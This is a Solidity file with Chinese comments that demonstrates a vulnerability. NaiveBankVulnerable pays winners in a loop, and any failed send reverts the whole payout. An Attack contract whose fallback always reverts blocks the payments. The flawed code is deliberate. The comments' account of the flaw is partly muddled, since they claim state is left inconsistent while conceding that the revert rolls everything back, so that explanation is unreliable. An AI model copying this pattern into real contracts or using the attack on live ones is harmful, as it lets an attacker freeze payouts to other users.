// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱: Incorrect Revert Implementation in a Loop
  描述: 此漏洞發生於在迴圈中進行多重外部呼叫時，
        如果其中某個呼叫失敗即使用 revert 來終止流程，
        但卻沒有在呼叫前先更新狀態或標記已處理，
        因此可能導致部分操作已經完成但狀態仍未正確修正，
        在重入或重試情境下造成錯誤。
  
  此合約模擬一個簡化的 NaiveBank，
  擁有一個 setTransfer 函式，在迴圈中對 winners 清單裡的地址進行 send 操作，
  當遇到攻擊者設計的合約(在 receive Ether 時 revert)時，就會觸發 revert，
  從而導致部分迴圈操作狀態未被正確更新，造成錯誤邏輯。
*/

contract NaiveBankVulnerable {
    // 狀態變數 winners 沒有在轉帳前先標記處理，這是漏洞的重點
    address payable[] public winners;
    uint public reward = 1 ether;
    mapping(address => bool) public processed; // 本範例未用到，但代表應有的處理狀態記錄

    constructor() {
        // 初始將部署者加入贏家清單
        winners.push(payable(msg.sender));
    }

    // 用於添加贏家地址
    function addWinner(address payable _winner) public {
        winners.push(_winner);
    }

    // 漏洞函式: 在迴圈中直接透過 send 進行轉帳，若 send 失敗即 revert，但未先更新狀態
    function setTransfer() public {
        // 漏洞重點: 未先標記 winners 為已處理，可能導致部分迴圈已送出 Ether，但部分沒更新處理狀態
        for (uint i = 0; i < winners.length; i++) {
            // 此行在遇到失敗時會 revert 整個交易，但之前的成功轉帳(如果有)也會在以太坊層面回滾，
            // 但實際應用中可能會出現部分操作（例如事件記錄或外部調用其他合約）未被同步回滾的情況
            require(winners[i].send(reward), "Send failed, reverting entire transaction"); // 漏洞處
        }
    }
}


/*
  攻擊合約: Attack
  此合約在接收 Ether 的 fallback 中故意 revert，以觸發 NaiveBankVulnerable 中的 require 失敗
  攻擊者可藉由將此合約地址加入 NaiveBankVulnerable 的 winners 清單中，
  當執行 setTransfer 時，迴圈會在遇到此地址時觸發失敗，從而造成漏洞利用。
*/

contract Attack {
    NaiveBankVulnerable public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = NaiveBankVulnerable(_vulnerableContract);
    }

    // fallback 函式，任何試圖發送 Ether 到此合約的動作都會觸發 revert，
    // 以達到阻斷 NaiveBankVulnerable 的迴圈中 send 成功的目的
    fallback() external payable {
        revert("Attack: Reverting on receive");
    }

    // 發動攻擊: 呼叫 vulnerableContract 的 setTransfer 函式
    function attack() public {
        vulnerableContract.setTransfer();
    }
}
